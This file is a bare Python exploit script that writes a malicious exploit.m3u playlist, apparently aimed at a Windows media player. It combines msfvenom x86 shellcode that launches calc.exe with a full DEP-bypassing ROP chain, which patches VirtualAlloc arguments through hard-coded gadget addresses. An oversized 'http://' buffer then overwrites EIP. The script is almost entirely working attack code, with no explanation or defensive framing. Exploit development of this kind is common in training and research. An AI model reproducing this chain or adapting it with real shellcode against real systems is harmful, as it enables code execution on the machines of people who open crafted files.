from struct import pack

#msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f python -b "\x00\x0a" -v shellcode
shellcode =  b""
shellcode += b"\xba\x2d\x63\x1e\x88\xda\xce\xd9\x74\x24\xf4"
shellcode += b"\x5e\x2b\xc9\xb1\x31\x31\x56\x13\x83\xc6\x04"
shellcode += b"\x03\x56\x22\x81\xeb\x74\xd4\xc7\x14\x85\x24"
shellcode += b"\xa8\x9d\x60\x15\xe8\xfa\xe1\x05\xd8\x89\xa4"
shellcode += b"\xa9\x93\xdc\x5c\x3a\xd1\xc8\x53\x8b\x5c\x2f"
shellcode += b"\x5d\x0c\xcc\x13\xfc\x8e\x0f\x40\xde\xaf\xdf"
shellcode += b"\x95\x1f\xe8\x02\x57\x4d\xa1\x49\xca\x62\xc6"
shellcode += b"\x04\xd7\x09\x94\x89\x5f\xed\x6c\xab\x4e\xa0"
shellcode += b"\xe7\xf2\x50\x42\x24\x8f\xd8\x5c\x29\xaa\x93"
shellcode += b"\xd7\x99\x40\x22\x3e\xd0\xa9\x89\x7f\xdd\x5b"
shellcode += b"\xd3\xb8\xd9\x83\xa6\xb0\x1a\x39\xb1\x06\x61"
shellcode += b"\xe5\x34\x9d\xc1\x6e\xee\x79\xf0\xa3\x69\x09"
shellcode += b"\xfe\x08\xfd\x55\xe2\x8f\xd2\xed\x1e\x1b\xd5"
shellcode += b"\x21\x97\x5f\xf2\xe5\xfc\x04\x9b\xbc\x58\xea"
shellcode += b"\xa4\xdf\x03\x53\x01\xab\xa9\x80\x38\xf6\xa7"
shellcode += b"\x57\xce\x8c\x85\x58\xd0\x8e\xb9\x30\xe1\x05"
shellcode += b"\x56\x46\xfe\xcf\x13\xa8\x1c\xda\x69\x41\xb9"
shellcode += b"\x8f\xd0\x0c\x3a\x7a\x16\x29\xb9\x8f\xe6\xce"
shellcode += b"\xa1\xe5\xe3\x8b\x65\x15\x99\x84\x03\x19\x0e"
shellcode += b"\xa4\x01\x7a\xd1\x36\xc9\x53\x74\xbf\x68\xac"


VA_placeholder = pack("<L", (0x45454545))  # VirtualAlloc Address
VA_placeholder += pack("<L", (0x46464646)) # Shellcode Return Address
VA_placeholder += pack("<L", (0x47474747)) # Shellcode Address
VA_placeholder += pack("<L", (0x48484848)) # dwSize
VA_placeholder += pack("<L", (0x49494949)) # flAllocationType
VA_placeholder += pack("<L", (0x50505050)) # flProtect


#########Patching the VirtualAlloc Address - the 45454545 placeholder#########
rop_chain = pack("<L", (0x10038f84)) # push esp ; and al, 0x10 ; pop esi ; mov dword [edx], eax ; mov eax, 0x00000001 ; ret  ;
rop_chain += pack("<L", (0x43434343)) # filler
rop_chain += pack("<L", (0x10022973)) # mov eax, esi ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0xffffffe0)) # -0x20
rop_chain += pack("<L", (0x1001465e)) # add eax, ecx ; ret  ;
rop_chain += pack("<L", (0x10040754)) # push eax ; pop esi ; pop ebp ; lea eax, dword [ecx+eax+0x0D] ; pop ebx ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into ebp
rop_chain += pack("<L", (0x42424242)) # junk value into ebx
rop_chain += pack("<L", (0x1002a779)) # pop eax ; ret  ;
rop_chain += pack("<L", (0x1004F060)) # VirtualAlloc KERNEL32 IAT
rop_chain += pack("<L", (0x1004d304)) # mov eax, dword [eax] ; ret  ;
rop_chain += pack("<L", (0x10049875)) # mov dword [esi], eax ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi


#########Patching the return Address - the 46464646 placeholder#########
rop_chain += pack("<L", (0x10038f84)) # push esp ; and al, 0x10 ; pop esi ; mov dword [edx], eax ; mov eax, 0x00000001 ; ret  ;
rop_chain += pack("<L", (0x10022973)) # mov eax, esi ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0xffffffac)) # -0x54
rop_chain += pack("<L", (0x1001465e)) # add eax, ecx ; ret  ;
rop_chain += pack("<L", (0x10040754)) # push eax ; pop esi ; pop ebp ; lea eax, dword [ecx+eax+0x0D] ; pop ebx ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into ebp
rop_chain += pack("<L", (0x42424242)) # junk value into ebx
rop_chain += pack("<L", (0x100122bb)) # push esi ; add al, 0x5E ; pop ebx ; ret  ;
rop_chain += pack("<L", (0x1001ce45)) # mov eax, ebx ; pop ebp ; pop ebx ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into ebp
rop_chain += pack("<L", (0x42424242)) # junk value into ebx
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0xfffffe10)) # -0x1f0
rop_chain += pack("<L", (0x1002c9a4)) # sub eax, ecx ; ret  ;
rop_chain += pack("<L", (0x10049875)) # mov dword [esi], eax ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi


#########Patching the shellcode address - the 47474747 placeholder#########
rop_chain += pack("<L", (0x10038f84)) # push esp ; and al, 0x10 ; pop esi ; mov dword [edx], eax ; mov eax, 0x00000001 ; ret  ;
rop_chain += pack("<L", (0x10022973)) # mov eax, esi ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0xffffff68)) # -0x98
rop_chain += pack("<L", (0x1001465e)) # add eax, ecx ; ret  ;
rop_chain += pack("<L", (0x10040754)) # push eax ; pop esi ; pop ebp ; lea eax, dword [ecx+eax+0x0D] ; pop ebx ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into ebp
rop_chain += pack("<L", (0x42424242)) # junk value into ebx
rop_chain += pack("<L", (0x100122bb)) # push esi ; add al, 0x5E ; pop ebx ; ret  ;
rop_chain += pack("<L", (0x1001ce45)) # mov eax, ebx ; pop ebp ; pop ebx ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into ebp
rop_chain += pack("<L", (0x42424242)) # junk value into ebx
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0xfffffe14)) # -0x1ec
rop_chain += pack("<L", (0x1002c9a4)) # sub eax, ecx ; ret  ;
rop_chain += pack("<L", (0x10049875)) # mov dword [esi], eax ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi


#########Patching dwSize - the 48484848 placeholder#########
rop_chain += pack("<L", (0x10038f84)) # push esp ; and al, 0x10 ; pop esi ; mov dword [edx], eax ; mov eax, 0x00000001 ; ret  ;
rop_chain += pack("<L", (0x10022973)) # mov eax, esi ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0xffffff24)) # -0xdc
rop_chain += pack("<L", (0x1001465e)) # add eax, ecx ; ret  ;
rop_chain += pack("<L", (0x10040754)) # push eax ; pop esi ; pop ebp ; lea eax, dword [ecx+eax+0x0D] ; pop ebx ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into ebp
rop_chain += pack("<L", (0x42424242)) # junk value into ebx
rop_chain += pack("<L", (0x1002a779)) # pop eax ; ret  ;
rop_chain += pack("<L", (0xffffffff)) # -1 to be NEGated
rop_chain += pack("<L", (0x1004d1c4)) # neg eax ; pop ebx ; ret ;
rop_chain += pack("<L", (0x42424242)) # junk value into ebx
rop_chain += pack("<L", (0x10049875)) # mov dword [esi], eax ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi


#########Patching flAllocationType - the 49494949 placeholder#########
rop_chain += pack("<L", (0x10038f84)) # push esp ; and al, 0x10 ; pop esi ; mov dword [edx], eax ; mov eax, 0x00000001 ; ret  ;
rop_chain += pack("<L", (0x10022973)) # mov eax, esi ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0xfffffeec)) # -0x114
rop_chain += pack("<L", (0x1001465e)) # add eax, ecx ; ret  ;
rop_chain += pack("<L", (0x10040754)) # push eax ; pop esi ; pop ebp ; lea eax, dword [ecx+eax+0x0D] ; pop ebx ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into ebp
rop_chain += pack("<L", (0x42424242)) # junk value into ebx
rop_chain += pack("<L", (0x1002a779)) # pop eax ; ret  ;
rop_chain += pack("<L", (0x88888888)) # the first value to be added
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0x77778778)) # the second value to be added
rop_chain += pack("<L", (0x1001465e)) # add eax, ecx ; ret  ;
rop_chain += pack("<L", (0x10049875)) # mov dword [esi], eax ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi


#########Patching flProtect - the 50505050 placeholder#########
rop_chain += pack("<L", (0x10038f84)) # push esp ; and al, 0x10 ; pop esi ; mov dword [edx], eax ; mov eax, 0x00000001 ; ret  ;
rop_chain += pack("<L", (0x10022973)) # mov eax, esi ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0xfffffeb0)) # -0x150
rop_chain += pack("<L", (0x1001465e)) # add eax, ecx ; ret  ;
rop_chain += pack("<L", (0x10040754)) # push eax ; pop esi ; pop ebp ; lea eax, dword [ecx+eax+0x0D] ; pop ebx ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into ebp
rop_chain += pack("<L", (0x42424242)) # junk value into ebx
rop_chain += pack("<L", (0x1002a779)) # pop eax ; ret  ;
rop_chain += pack("<L", (0x88888888)) # first value to be added
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0x777777b8)) # second value to be added
rop_chain += pack("<L", (0x1001465e)) # add eax, ecx ; ret  ;
rop_chain += pack("<L", (0x10049875)) # mov dword [esi], eax ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi


#########Executing VirtualAlloc#########
rop_chain += pack("<L", (0x10038f84)) # push esp ; and al, 0x10 ; pop esi ; mov dword [edx], eax ; mov eax, 0x00000001 ; ret  ;
rop_chain += pack("<L", (0x10022973)) # mov eax, esi ; pop esi ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into esi
rop_chain += pack("<L", (0x1003985f)) # pop ecx ; ret  ;
rop_chain += pack("<L", (0xfffffe58)) # -0x1a8
rop_chain += pack("<L", (0x1001465e)) # add eax, ecx ; ret  ;
rop_chain += pack("<L", (0x100406ee)) # push eax ; pop ebp ; pop ebx ; mov eax, dword [eax+ecx+0x02] ; ret  ;
rop_chain += pack("<L", (0x42424242)) # junk value into ebx
rop_chain += pack("<L", (0x100411fa)) # mov esp, ebp ; pop ebp ; ret  ;


buffer = "http://"
buffer += "A" * (17417 - len(VA_placeholder))
buffer += VA_placeholder
buffer += rop_chain #EIP overwrite
buffer += "\x90" * 100
buffer += shellcode
buffer += "D"*(18000-len(buffer))

f=open("exploit.m3u", "w")
f.write(buffer)
f.close()
